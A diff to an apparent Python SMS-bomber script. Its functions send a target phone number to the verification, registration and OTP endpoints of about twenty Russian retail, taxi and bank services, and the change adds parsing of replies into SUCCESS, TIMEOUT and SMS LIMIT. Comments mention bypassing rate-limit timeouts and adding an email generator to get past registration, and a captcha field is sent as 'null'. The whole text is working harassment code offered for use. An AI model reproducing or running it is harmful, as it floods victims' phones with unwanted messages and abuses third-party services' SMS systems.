@@ -94,7 +94,11 @@ def sunlight(phone):
     snlghtphn = '7' + phone
     response_sunlight = requests.post(url='https://api.sunlight.net/v3/customers/authorization/',
                                       json={"phone": snlghtphn})
-    print(response_sunlight, response_sunlight.content)
+    format_response = response_sunlight.json()
+    if format_response['status'] == {'code': 200, 'success': '1'}:
+        print('SUCCESS', response_sunlight.status_code, sunlight.__name__)
+    else:
+        print('UNKNOWN ERROR', response_sunlight.status_code, sunlight.__name__)
 
 
 def bk(phone):
@@ -103,14 +107,28 @@ def bk(phone):
     response_bk = requests.post(url='https://deliverysmart.burgerking.ru/account/session',
                                 json={"phone": bkphn,
                                       "g-recaptcha-response": "null"})
-    print(response_bk, response_bk.content)
+    if response_bk.status_code == 201:
+        format_response = response_bk.json()
+        if format_response['auth_token']['errors'] == {}:
+            print('SUCCESS', response_bk.status_code, bk.__name__)
+    elif response_bk.status_code == 429:
+        print('TIMEOUT', response_bk.status_code, bk.__name__)
+    else: 
+        print('UNKNOWN ERROR', response_bk.status_code, bk.__name__)
 
 def kfc(phone):
     kfcphn = '+7' + phone
     response_kfc = requests.post(url=('https://app-api.kfc.ru/api/v1/'
                                       'common/auth/send-validation-sms'),
                                  json={"phone": kfcphn})
-    print(response_kfc, response_kfc.content)
+    format_response = response_kfc.json()
+    if 'success' in format_response:
+        print('SUCCESS', response_kfc.status_code, kfc.__name__)
+    elif 'errorCode' in format_response:
+        if format_response['errorCode'] == 'App\Api\Exceptions\Auth\WrongPhoneNumberException':
+            print('TIMEOUT', response_kfc.status_code, kfc.__name__) 
+    else:
+        print('UNKNOWN ERROR', response_kfc.status_code, kfc.__name__)
 
 #  ваще без таймаута походу
 def taxinonstop(phone):
@@ -118,13 +136,25 @@ def taxinonstop(phone):
     response_taxinonstop = requests.post(url='https://taxinonstop.ru/dist/backend/register.php',
                                          json={"cmd": "register", "phone": txnnstpphn,
                                                "taxi_city": "tmn"})
-    print(response_taxinonstop, response_taxinonstop.content)
+    format_response = response_taxinonstop.json()
+    if format_response['result'] == 'ok':
+        print('SUCCESS', response_taxinonstop.status_code, taxinonstop.__name__)
+    elif format_response['result'] == 'time':
+        print('TIMEOUT', response_taxinonstop.status_code, taxinonstop.__name__)
+    else:
+        print('UNKNOWN ERROR', response_taxinonstop.status_code, taxinonstop.__name__)
+
 
 def karusel(phone):
     krslphn = '7' + phone
     response_karusel = requests.post(url='https://app.karusel.ru/api/v1/phone/',
                                      json={"phone": krslphn})
-    print(response_karusel, response_karusel.content)
+    if response_karusel.status_code == 200:
+        print('SUCCESS', response_karusel.status_code, karusel.__name__)
+    elif response_karusel.status_code == 400:
+        print('TIMEOUT', response_karusel.status_code, karusel.__name__)
+    else:
+        print('UNKNOWN ERROR', response_karusel.status_code, karusel.__name__)
 
 #  приделать генератор мыл, тут обязательно надо
 def taxi2412regist(phone):
@@ -139,7 +169,11 @@ def taxi2412regist(phone):
 
     }
     response_taxi2412 = requests.post(url='https://lk.taxi2412.ru/register', data=data)
-    print(response_taxi2412, response_taxi2412.text)
+    format_response = response_taxi2412.json()
+    if 'html' in format_response and response_taxi2412.status_code == 200:
+        print('SUCCESS', response_taxi2412.status_code, taxi2412regist.__name__)
+    else:
+        print('REGISTERED YET', response_taxi2412.status_code, taxi2412regist.__name__)
 
 def taxi2412recover(phone):
     tx2412phn = '+7' + ' ' + phone[:3] + ' ' + phone[3:6] + '-' + phone[6:8] +\
@@ -148,7 +182,13 @@ def taxi2412recover(phone):
         'phone': tx2412phn
     }
     response_taxi2412 = requests.post(url='https://lk.taxi2412.ru/recover', data=data)
-    print(response_taxi2412, response_taxi2412.text)
+    format_response = response_taxi2412.json()
+    if format_response['target'] == 'success':
+        print('SUCCESS', response_taxi2412.status_code, taxi2412recover.__name__)
+    elif format_response['target'] == 'form':
+        print('TIMEOUT', response_taxi2412.status_code, taxi2412recover.__name__)
+    else:
+        print('UNKNOWN ERROR', response_taxi2412.status_code, taxi2412recover.__name__)
 
 def ostin(phone):
     ostnphn = '%207%20' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
@@ -156,7 +196,13 @@ def ostin(phone):
     response_ostin = requests.post(url=('https://ostin.com/ru/ru/secured/myaccount/myclubcard/'
                                         'resultClubCard.jsp?type='
                                         'sendConfirmCode&phoneNumber=' + ostnphn))
-    print(response_ostin, response_ostin.text)
+    format_response = response_ostin.json()
+    if response_ostin.status_code == 200 and format_response['result'] == 'sendConfirmCode':
+        print('SUCCESS', response_ostin.status_code, ostin.__name__)
+    elif response_ostin.status_code == 200 and format_response['result'] == 'smsTimeout':
+        print('TIMEOUT', response_ostin.status_code, ostin.__name__)
+    else:
+        print('UNKNOWN ERROR', response_ostin.status_code, ostin.__name__)
 
 def funday(phone):
     fndphn = '+7%20' + '(' + phone[:3] + ')' + phone[3:6] + '-' + phone[6:8] + '-'\
@@ -164,7 +210,13 @@ def funday(phone):
     response_funday = requests.post(url=('http://fundayshop.com/ru/ru/secured/myaccount/myclubcard/'
                                          'resultClubCard.jsp?type='
                                          'sendConfirmCode&phoneNumber=' + fndphn))
-    print(response_funday, response_funday.text)
+    format_response = response_funday.json()
+    if response_funday.status_code == 200 and format_response['result'] == 'sendConfirmCode':
+        print('SUCCESS', response_funday.status_code, funday.__name__)
+    elif response_funday.status_code == 200 and format_response['result'] == 'smsTimeout':
+        print('TIMEOUT', response_funday.status_code, funday.__name__)
+    else:
+        print('UNKNOWN ERROR', response_funday.status_code, funday.__name__)
 
 def sela(phone):
     slphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
@@ -180,7 +232,12 @@ def sela(phone):
         'agree': '1'
     }
     response_sela = requests.post(url='https://www.sela.ru/sela/bonus/signup/', data=data)
-    print(response_sela, response_sela.content)
+    format_response = response_sela.json()
+    if format_response['status'] == 'ok':
+        print('SUCCESS', response_sela.status_code, sela.__name__)
+    else:
+        print('UNKNOWN ERROR', response_sela.status_code, sela.__name__)
+
 
 def novextrade(phone):
     nvxtrdphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
@@ -192,7 +249,10 @@ def novextrade(phone):
     }
     response_novextrade = requests.post(url=('http://www.novex-trade.ru/index.php?dispatch='
                                              'nvx.send_sms_confirm_code'), data=data)
-    print(response_novextrade, response_novextrade.content)
+    if response_novextrade.status_code == 200:
+        print('SUCCESS', response_novextrade.status_code, novextrade.__name__)
+    else:
+        print('UNKNOWN ERROR', response_novextrade.status_code, novextrade.__name__)
 
 def atb(phone):
     atbphn = '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
@@ -204,14 +264,22 @@ def atb(phone):
     response_atb = requests.post(url=('https://www.atb.su/local/templates/main/ajax/main/'
                                       'send_sms_new.php'),
                                  data=data)
-    print(response_atb, response_atb.content)
+    if response_atb.status_code == 200:
+        print('SUCCESS', response_atb.status_code, atb.__name__)
+    else:
+        print('UNKNOWN ERROR', response_atb.status_code, atb.__name__)
 
 # timeout 120, used 180
 def lenta(phone):
     lntphn = '+7' + phone
     response_lenta = requests.post(url=('https://lk.lenta.com/api/v1/authentication/'
                                         'requestValidationCode'), json={"phone": lntphn})
-    print(response_lenta, response_lenta.content)
+    if response_lenta.status_code == 200:
+        print('SUCCESS', response_lenta.status_code, lenta.__name__)
+    elif response_lenta.status_code == 403:
+        print('TIMEOUT', response_lenta.status_code, lenta.__name__)
+    else:
+        print('UNKNOWN ERROR', response_lenta.status_code, lenta.__name__)
 
 # timeout 120, used 180
 def beelinecredit(phone):
@@ -223,7 +291,13 @@ def beelinecredit(phone):
                                                                   "phoneNumber": blncrdtphn},
                                                  "consentToDataProcessing": "true"})
 
-    print(response_beelinecredit, response_beelinecredit.content)
+    format_response = response_beelinecredit.json()
+    if format_response['messageCode'] == 1:
+        print('SUCCESS', response_beelinecredit.status_code, beelinecredit.__name__)
+    elif format_response['messageCode'] == 26:
+        print('TIMEOUT', response_beelinecredit.status_code, beelinecredit.__name__)
+    else:
+        print('UNKNOWN ERROR', response_beelinecredit.status_code, beelinecredit.__name__)
 
 def youla(phone):
     ylphn = '7' + phone
@@ -231,7 +305,13 @@ def youla(phone):
         'phone': ylphn
     }
     response_youla = requests.post(url='https://youla.ru/web-api/auth/request_code', data=data)
-    print(response_youla, response_youla.content)
+    if response_youla.status_code == 200:
+        print('SUCCESS', response_youla.status_code, youla.__name__)
+    elif response_youla.status_code == 512:
+        print('SMS LIMIT', response_youla.status_code, youla.__name__)
+    else:
+        print('UNKNOWN ERROR', response_youla.status_code, youla.__name__)
+    print(response_youla.content)
 
 def befree(phone):
     bfrphn = '+7' + ' ' + '(' + phone[:3] + ')' + ' ' + phone[3:6] + '-' + phone[6:8] +\
@@ -240,7 +320,13 @@ def befree(phone):
         'telephone': bfrphn
     }
     response_befree = requests.post(url='https://www.befree.ru/reward/guest/sendCode/', data=data)
-    print(response_befree, response_befree.content)
+    format_response = response_befree.json()
+    if format_response['status'] == 'success' and response_befree.status_code == 200:
+        print('SUCCESS', response_befree.status_code, befree.__name__)
+    elif format_response['status'] == 'error' and response_befree.status_code == 200:
+        print('TIMEOUT', response_befree.status_code, befree.__name__)
+    else:
+        print('UNKNOWN ERROR', response_befree.status_code, befree.__name__)
 
 #  таймаут написано 30 сек, но я вроде его обошел
 def mtsbank(phone):
@@ -250,14 +336,25 @@ def mtsbank(phone):
         'phone': mtsbnkphn
     }
     response_mtsbank = requests.post(url='https://www.mtsbank.ru/ajax/sms.php', data=data)
-    print(response_mtsbank, response_mtsbank.content)
+    format_response = response_mtsbank.json()
+    lmt_message = 'Sms quantity exceeded max value'
+    if response_mtsbank.status_code == 200 and format_response['meta']['message'] == '':
+        print('SUCCESS', response_mtsbank.status_code, mtsbank.__name__)
+    elif response_mtsbank.status_code == 200 and format_response['meta']['message'] == lmt_message:
+        print('SMS LIMIT', response_mtsbank.status_code, mtsbank.__name__)
+    else:
+        print('UNKNOWN ERROR', response_mtsbank.status_code, mtsbank.__name__)
+
 
 def otkr(phone):
     otkrphn = '7' + phone
 
     response_otkr = requests.post(url='https://services.open.ru/anketa/api/public/otp',
                                   json={"phone": otkrphn})
-    print(response_otkr, response_otkr.content)
+    if response_otkr.status_code == 200:
+        print('SUCCESS', response_otkr.status_code, otkr.__name__)
+    elif response_otkr.status_code == 429:
+        print('TIMEOUT', response_otkr.status_code, otkr.__name__)
 
 
 def run(phone, n):
